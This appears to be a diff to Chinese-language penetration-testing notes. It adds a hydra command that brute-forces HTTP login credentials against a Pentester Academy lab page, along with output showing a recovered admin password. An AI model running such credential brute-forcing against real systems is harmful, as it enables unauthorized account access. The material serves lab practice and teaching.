@@ -104,6 +104,17 @@ run
 
 # hydra暴力破解HTTP身份验证
 ```
-hydra -L /root/demo/users.txt -P /root/demo/pass.txt http-post://pentesteracademylab.appspot.com/lab/webapp/basicauth
+hydra -L users.txt -P pass.txt http-post://pentesteracademylab.appspot.com/lab/webapp/basicauth
+```
+```
+[root@ideal-cluster-2 ~]# hydra -L users.txt -P pass.txt http-post://pentesteracademylab.appspot.com/lab/webapp/basicauth
+Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-29 01:55:19
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:3/p:4), ~1 try per task
+[DATA] attacking http-post://pentesteracademylab.appspot.com:80/lab/webapp/basicauth
+[80][http-post] host: pentesteracademylab.appspot.com   login: admin   password: aaddd
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-29 01:55:19
 ```
 hydra使用参考 [hydra使用介绍](https://dm116.github.io/2020/01/27/hydra/)
